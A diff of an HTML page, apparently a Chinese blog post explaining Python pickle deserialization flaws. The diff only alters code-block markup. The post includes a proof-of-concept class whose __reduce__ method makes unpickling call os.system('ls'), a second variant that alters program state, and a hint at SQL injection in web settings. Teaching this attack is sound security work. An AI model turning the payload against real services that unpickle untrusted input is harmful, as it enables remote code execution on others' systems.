@@ -68,20 +68,19 @@
 <h2 id="python">Python</h2>
 
 <p>Python 会出问题的反序列化的方法就是<code class="highlighter-rouge">pickle</code>，下面是简单的用法</p>
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">cPickle</span> 
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">cPickle</span> 
 
 <span class="n">data</span> <span class="o">=</span> <span class="s">"test"</span>
 <span class="c"># 序列化 </span>
 <span class="n">packed</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
 <span class="c"># 反序列化 </span>
 <span class="n">data</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">packed</span><span class="p">)</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>其中 data 可以保存在文件中或者发送到另外的机器上去执行的。参考 https://blog.nelhage.com/2011/03/exploiting-pickle/</p>
 
 <p>在反序列化的时候，<code class="highlighter-rouge">__reduce__</code>是声明反序列化的方法的，返回值类型有一种是元组，包含两个元素，回调函数和回调函数参数元组。这样我们就可以将恶意代码放入<code class="highlighter-rouge">__reduce__</code>里面或者是回调函数里面。</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
 <span class="kn">import</span> <span class="nn">cPickle</span>
 
 <span class="c"># Exploit that we want the target to unpickle</span>
@@ -91,8 +90,7 @@
         <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">'ls'</span><span class="p">,))</span>
 
 <span class="n">shellcode</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Exploit</span><span class="p">())</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>利用场景</p>
 
 <ul>
@@ -104,7 +102,7 @@
   </li>
 </ul>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
 <span class="kn">import</span> <span class="nn">cPickle</span>
 <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span>
 <span class="c"># Exploit that we want the target to unpickle</span>
@@ -118,8 +116,7 @@
 <span class="n">shellcode</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Exploit</span><span class="p">())</span>
 <span class="n">cPickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">a</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>最后输出的 a 已经是10了，web 环境下可以尝试进行 sql 注入。</p>
 
 <h2 id="ruby">ruby</h2>
